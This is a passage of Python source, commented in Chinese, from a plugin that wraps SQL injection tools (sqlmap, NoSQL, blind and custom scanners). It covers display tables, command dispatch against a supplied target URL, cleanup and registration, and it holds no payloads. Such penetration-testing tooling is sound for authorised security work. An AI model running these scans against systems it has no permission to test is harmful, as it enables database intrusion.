        """顯示掃描結果"""
        summary = results['summary']
        
        # 掃描摘要
        summary_table = Table(title="[bold cyan]掃描摘要[/bold cyan]")
        summary_table.add_column("項目", style="yellow")
        summary_table.add_column("數量", style="green")
        
        summary_table.add_row("總漏洞數", str(summary['total_vulnerabilities']))
        summary_table.add_row("嚴重漏洞", str(summary['critical_vulnerabilities']))
        summary_table.add_row("高危漏洞", str(summary['high_vulnerabilities']))
        summary_table.add_row("中危漏洞", str(summary['medium_vulnerabilities']))
        summary_table.add_row("低危漏洞", str(summary['low_vulnerabilities']))
        
        console.print(summary_table)
        
        # 掃描方法統計
        method_table = Table(title="[bold blue]掃描方法統計[/bold blue]")
        method_table.add_column("掃描方法", style="cyan")
        method_table.add_column("發現漏洞", style="green")
        
        for method, count in summary['scan_methods'].items():
            method_table.add_row(method.title(), str(count))
        
        console.print(method_table)


class SQLInjectionCapability(BaseCapability):
    """SQL 注入工具集能力類"""
    
    def __init__(self):
        super().__init__()
        self.manager = SQLInjectionManager()
        self.cli = SQLInjectionCLI(self.manager)
        
    @property
    def name(self) -> str:
        return "sql_injection_tools"
    
    @property
    def version(self) -> str:
        return "1.0.0"
    
    @property
    def description(self) -> str:
        return "SQL 注入工具集 - Sqlmap、NoSQL、盲注、自定義掃描器集成"
    
    @property
    def dependencies(self) -> List[str]:
        return ["aiohttp", "requests", "rich"]
    
    async def initialize(self) -> bool:
        """初始化 SQL 注入工具集"""
        try:
            logger.info("初始化 SQL 注入工具集...")
            
            # 檢查 Sqlmap 是否可用
            if not self.manager.sqlmap.sqlmap_path:
                logger.warning("Sqlmap 未找到，將在首次使用時自動安裝")
            
            logger.info("SQL 注入工具集初始化完成")
            return True
            
        except Exception as e:
            logger.error(f"SQL 注入工具集初始化失敗: {e}")
            return False
    
    async def execute(self, command: str, parameters: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """執行 SQL 注入命令"""
        try:
            parameters = parameters or {}
            
            if command == "comprehensive_scan":
                target_url = parameters.get('target_url')
                if not target_url:
                    return {'success': False, 'error': 'Missing target_url parameter'}
                
                options = parameters.get('options', {})
                results = await self.manager.comprehensive_scan(target_url, options)
                return {'success': True, 'data': results}
            
            elif command == "sqlmap_scan":
                target_url = parameters.get('target_url')
                if not target_url:
                    return {'success': False, 'error': 'Missing target_url parameter'}
                
                target = self.manager._parse_target(target_url, parameters)
                sqlmap_options = parameters.get('sqlmap_options', {})
                results = await self.manager.sqlmap.scan_target(target, sqlmap_options)
                return {'success': True, 'data': [self.manager._result_to_dict(r) for r in results]}
            
            elif command == "custom_scan":
                target_url = parameters.get('target_url')
                if not target_url:
                    return {'success': False, 'error': 'Missing target_url parameter'}
                
                target = self.manager._parse_target(target_url, parameters)
                results = await self.manager.custom_scanner.scan_target(target)
                return {'success': True, 'data': [self.manager._result_to_dict(r) for r in results]}
            
            elif command == "nosql_scan":
                target_url = parameters.get('target_url')
                if not target_url:
                    return {'success': False, 'error': 'Missing target_url parameter'}
                
                target = self.manager._parse_target(target_url, parameters)
                results = await self.manager.nosql_scanner.scan_target(target)
                return {'success': True, 'data': [self.manager._result_to_dict(r) for r in results]}
            
            elif command == "blind_scan":
                target_url = parameters.get('target_url')
                if not target_url:
                    return {'success': False, 'error': 'Missing target_url parameter'}
                
                target = self.manager._parse_target(target_url, parameters)
                results = await self.manager.blind_scanner.scan_blind_injection(target)
                return {'success': True, 'data': [self.manager._result_to_dict(r) for r in results]}
            
            elif command == "interactive":
                await self.cli.run_interactive()
                return {'success': True, 'message': 'Interactive session completed'}
            
            else:
                return {'success': False, 'error': f'Unknown command: {command}'}
                
        except Exception as e:
            logger.error(f"執行 SQL 注入命令失敗: {e}")
            return {'success': False, 'error': str(e)}
    
    async def cleanup(self) -> bool:
        """清理資源"""
        try:
            # 清理掃描結果
            self.manager.scan_results.clear()
            
            # 清理 sqlmap 會話文件
            for session_file in self.manager.sqlmap.session_files:
                try:
                    if session_file.exists():
                        session_file.unlink()
                except Exception as e:
                    logger.warning(f"清理會話文件失敗: {e}")
            
            logger.info("SQL 注入工具集清理完成")
            return True
        except Exception as e:
            logger.error(f"SQL 注入工具集清理失敗: {e}")
            return False


# 註冊能力到系統
async def register_capability():
    """註冊 SQL 注入工具集能力"""
    try:
        capability = SQLInjectionCapability()
        success = await CapabilityRegistry.register_capability(capability)
        if success:
            logger.info("SQL 注入工具集能力註冊成功")
        else:
            logger.error("SQL 注入工具集能力註冊失敗")
        return success
    except Exception as e:
        logger.error(f"註冊 SQL 注入工具集能力時發生錯誤: {e}")
        return False


if __name__ == "__main__":
    async def main():
        """主函數 - 用於測試"""
        capability = SQLInjectionCapability()
        await capability.initialize()
        
        # 測試交互式介面
        await capability.execute('interactive')
    
    asyncio.run(main())